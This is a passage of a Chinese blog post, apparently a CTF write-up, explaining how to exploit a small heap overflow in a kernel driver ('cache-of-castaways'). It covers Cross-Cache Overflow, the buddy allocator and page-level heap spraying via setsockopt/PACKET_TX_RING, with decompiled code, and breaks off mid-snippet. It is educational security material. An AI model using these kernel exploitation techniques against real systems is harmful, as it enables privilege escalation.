@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="cache-of-castaways 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 \    -m 4096M \    -nographic \    -kernel bzImage \    -append &quot;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;-1 pti&#x3D;on&quot; \    -netd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross-Cache Overflow+页级堆风水">
+<meta property="og:url" content="http://example.com/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="cache-of-castaways 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 \    -m 4096M \    -nographic \    -kernel bzImage \    -append &quot;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;-1 pti&#x3D;on&quot; \    -netd">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/1653447102092.png">
+<meta property="article:published_time" content="2023-05-21T10:02:57.000Z">
+<meta property="article:modified_time" content="2023-05-21T10:04:25.708Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="Cross-Cache Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/1653447102092.png">
+
+<link rel="canonical" href="http://example.com/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Cross-Cache Overflow+页级堆风水 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Cross-Cache Overflow+页级堆风水
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-21 18:02:57 / Modified: 18:04:25" itemprop="dateCreated datePublished" datetime="2023-05-21T18:02:57+08:00">2023-05-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>15 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>cache-of-castaways</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 4096M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot; \</span><br><span class="line">    -netdev user,id=net \</span><br><span class="line">    -device e1000,netdev=net \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -initrd ./rootfs.cpio</span><br></pre></td></tr></table></figure>
+<ul>
+<li>smap，smep，pti</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">export PS1=&#x27;\[\033[01;35m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="line">export PATH=/bin</span><br><span class="line"></span><br><span class="line">[ -d /dev ] || mkdir -m 0755 /dev</span><br><span class="line">[ -d /sys ] || mkdir /sys</span><br><span class="line">[ -d /proc ] || mkdir /proc</span><br><span class="line">[ -d /tmp ] || mkdir /tmp</span><br><span class="line">[ -d /run ] || mkdir /run</span><br><span class="line">[ -d /root ] || mkdir /root</span><br><span class="line">[ -d /etc ] || mkdir /etc</span><br><span class="line">[ -d /home ] || mkdir /home</span><br><span class="line"></span><br><span class="line">echo &#x27;root:x:0:0:root:/root:/bin/sh&#x27; &gt; /etc/passwd</span><br><span class="line">echo &#x27;root:x:0:&#x27; &gt; /etc/group</span><br><span class="line">chmod 644 /etc/passwd</span><br><span class="line">chmod 644 /etc/group</span><br><span class="line"></span><br><span class="line">adduser ctf --disabled-password 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">chown -R root:root /</span><br><span class="line">chmod 700 -R /root</span><br><span class="line"></span><br><span class="line">insmod /cache_of_castaway.ko</span><br><span class="line"></span><br><span class="line">chown ctf:ctf /home/ctf</span><br><span class="line">chmod 777 /home/ctf</span><br><span class="line">chmod 755 /dev</span><br><span class="line">chmod 777 -R /tmp</span><br><span class="line"></span><br><span class="line">mount -t proc -o nodev,noexec,nosuid proc /proc</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"></span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mkdir -p /var/lock</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true</span><br><span class="line"></span><br><span class="line">ln -sf /proc/mounts /etc/mtab</span><br><span class="line">chmod 666 /dev/castaway</span><br><span class="line"></span><br><span class="line">ip link set eth0 up</span><br><span class="line">udhcpc -i eth0 -s /etc/udhcp/simple.script 1&gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"></span><br><span class="line">echo &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">cat /etc/motd</span><br><span class="line"></span><br><span class="line">cd /home/ctf</span><br><span class="line"></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f%  </span><br></pre></td></tr></table></figure>
+<ul>
+<li>kptr_restrict</li>
+<li>dmesg_restrict</li>
+<li>perf_event_paranoid</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">castaway_ioctl</span><span class="params">(FILE *fd, <span class="keyword">int</span> cmd, <span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> **chunk; <span class="comment">// rbx</span></span><br><span class="line">  Node input; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0xCAFEBABE</span> )                      <span class="comment">// KALLOC</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    index = castaway_ctr;</span><br><span class="line">    <span class="keyword">if</span> ( castaway_ctr &lt;= <span class="number">0x18F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++castaway_ctr;</span><br><span class="line">      chunk = &amp;castaway_arr[index];</span><br><span class="line">      *chunk = (<span class="keyword">char</span> *)kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>LL);<span class="comment">// 0x200</span></span><br><span class="line">      <span class="keyword">if</span> ( castaway_arr[index] )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    castaway_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !copy_from_user(&amp;input, args, <span class="number">0x18</span>LL) )<span class="comment">// KWRITE</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      castaway_edit(input.index, input.size, input.ptr);</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里的 castaway_cachep 是程序自己分配的 kmem_cache，并且创建 flag 为 <code>SLAB_ACCOUNT</code>，同时开启了 <code>CONFIG_MEMCG_KMEM=y</code></li>
+<li>这意味着这是一个独立的 kmem_cache（与内核自带的 kmem_cache-512 相独立，二者不会相互干扰）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SLAB_ACCOUNT		((slab_flags_t __force)0x04000000U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SLAB_ACCOUNT		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>内核分配 kmem_cache 的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  castaway_dev = <span class="number">0xFF</span>;</span><br><span class="line">  qword_8A8 = (__int64)<span class="string">&quot;castaway&quot;</span>;</span><br><span class="line">  qword_8B0 = (__int64)&amp;castaway_fops;</span><br><span class="line">  _mutex_init(&amp;castaway_lock, <span class="string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)misc_register(&amp;castaway_dev) )</span><br><span class="line">  &#123;</span><br><span class="line">    castaway_arr = (<span class="keyword">char</span> **)kmem_cache_alloc(kmalloc_caches[<span class="number">12</span>], <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( castaway_arr )</span><br><span class="line">    &#123;</span><br><span class="line">      castaway_cachep = kmem_cache_create(<span class="string">&quot;castaway_cache&quot;</span>, <span class="number">0x200</span>LL, <span class="number">1LL</span>, <span class="number">0x4040000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( castaway_cachep )</span><br><span class="line">        init_castaway_driver_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题目的漏洞就在 <code>castaway_edit</code> 函数中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">castaway_edit</span><span class="params">(<span class="keyword">unsigned</span> __int64 index, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> to[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x18F</span></span><br><span class="line">    || !castaway_arr[index]</span><br><span class="line">    || size &gt; <span class="number">0x200</span></span><br><span class="line">    || (_check_object_size(to, size, <span class="number">0LL</span>), copy_from_user(to, from, size)) )</span><br><span class="line">  &#123;</span><br><span class="line">    castaway_edit_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(castaway_arr[index] + <span class="number">6</span>, to, size);  <span class="comment">// 6字节溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>有6字节的堆溢出，但是该 kmem_cache 是独立的，它上边的 object 很难溢出到内核自带的 kmem_cache-512 上</li>
+<li>于是需要另一个技术：Cross-Cache Overflow</li>
+</ul>
+<p><strong>Cross-Cache Overflow</strong></p>
+<p>Cross-Cache Overflow 本质上是针对 buddy system 完成对 slub 攻击的利用手法</p>
+<p>伙伴系统 buddy system 的机制如下：</p>
+<ul>
+<li>把系统中要管理的物理内存按照页面个数分为了11个组，分别对应11种大小不同的连续内存块，每组中的内存块大小都相等，且必须是2的n次幂 (Pow(2, n))，即 1, 2, 4, 8, 16, 32, 64, 128 … 1024</li>
+<li>那么系统中就存在 2^0~2^10 这么11种大小不同的内存块，对应内存块大小为 4KB ~ 4M，内核用11个链表来管理11种大小不同的内存块（这11个双向链表都存储在 free_area 中）</li>
+<li>在操作内存时，经常将这些内存块分成大小相等的两个块，分成的两个内存块被称为伙伴块，采用 “一位二进制数” 来表示它们的伙伴关系（这个 “一位二进制数” 存储在位图 bitmap 中）</li>
+<li>系统根据该位为 “0” 或位为 “1” 来决定是否使用或者分配该页面块，系统每次分配和回收伙伴块时都要对它们的伙伴位跟 “1” 进行异或运算</li>
+</ul>
+<p>Cross-Cache Overflow 就是为了实现跨 kmem_cache 溢出的利用手法：</p>
+<ul>
+<li>slub 底层逻辑是向 buddy system 请求页面后再划分成特定大小 object 返还给上层调用者</li>
+<li>但内存中用作不同 <code>kmem_cache</code> 的页面在内存上是有可能相邻的</li>
+<li>若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A,B 两页面相邻，则我们便有可能实现跨越不同 <code>kmem_cache</code> 之间的堆溢出</li>
+</ul>
+<p>Cross-Cache Overflow 需要两个 page 相邻排版，此时又需要使用另一个技术：页级堆风水</p>
+<p><strong>页级堆风水</strong></p>
+<p>页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布</p>
+<p>伙伴系统采用一个双向链表数组 free_area 来管理各个空闲块，在分配 page 时有如下的逻辑：</p>
+<ul>
+<li>free_area 的每个条目都是一个用于管理 2^n 大小空闲块的双向链表，每个 free_area[x] 都有一个 map 位图（用于表示各个伙伴块的关系）</li>
+</ul>
+<p><img src="/2023/05/21/Cross-Cache%20Overflow+%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/1653447102092.png" alt="1653447102092"> </p>
+<ul>
+<li>当一个 m page 大小的空间将要被申请时，伙伴系统会首先在 free_area[n] 中查找（刚好满足条件的最小 n）</li>
+<li>如果 free_area[n] 中有合适的内存块就直接分配出去，如果没有就继续在 free_area[n+1] 中查找</li>
+<li>如果 free_area[n+1] 中有合适的内存块，就会将其均分为两份：<ul>
+<li>其中一份分配出去</li>
+<li>另一个插入 free_area[n] 中</li>
+</ul>
+</li>
+<li>如果 free_area[n+1] 中也没有合适的内存块，则重复上面的过程，如果到达 free_area 数组的末端则放弃分配</li>
+<li>如果在 bitmap 中检测到有两个伙伴块都处于空闲状态，则会进行合并，然后插入上级链表</li>
+</ul>
+<p>通过伙伴系统的分配流程我们可以发现：互为伙伴块的两片内存块一定是连续的</p>
+<p>从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：</p>
+<ul>
+<li>向 buddy system 请求两份连续的内存页</li>
+<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li>
+<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li>
+</ul>
+<p>这样就可以保证 <code>vulnerable kmem_cache</code> 和 <code>victim kmem_cache</code> 就一定是连续的</p>
+<p>如果想要完成上述操作，就需要使用 setsockopt 与 pgv 完成页级内存占位与堆风水</p>
+<p><strong>setsockopt + pgv</strong></p>
+<p>函数 <code>setsockopt</code> 用于任意类型，任意状态套接口的设置选项值，其函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">( <span class="keyword">int</span> socket, <span class="keyword">int</span> level, <span class="keyword">int</span> option_name,<span class="keyword">const</span> <span class="keyword">void</span> *option_value, <span class="keyword">size_t</span> ption_len)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>socket：套接字</li>
+<li>level：被设置的选项的级别（如果想要在套接字级别上设置选项，就必须把 level 设置为 SOL_SOCKET）</li>
+<li>option_name：指定准备设置的“选项” </li>
+<li>option_value：指向存放选项值的缓冲区（用于设置所选“选项”的值）</li>
+<li>ption_len：缓冲区的长度 </li>
+<li>返回值：若无错误发生返回 “0”，否则返回 SOCKET_ERROR 错误（应用程序可通过 <code>WSAGetLastError()</code> 获取相应错误代码）</li>
+</ul>
+<p>利用步骤如下：</p>
+<ul>
+<li>创建一个 protocol 为 <code>PF_PACKET</code> 的 socket</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先调用 <code>setsockopt</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code> / <code>TPACKET_V2</code>（）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>再调用 <code>setsockopt</code> 提交一个 <code>PACKET_TX_RING</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure>
+<p>此时便存在如下调用链： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">        packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">            packet_set_ring()</span><br><span class="line">                alloc_pg_vec()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 <code>alloc_pg_vec</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2^order 大小的内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span 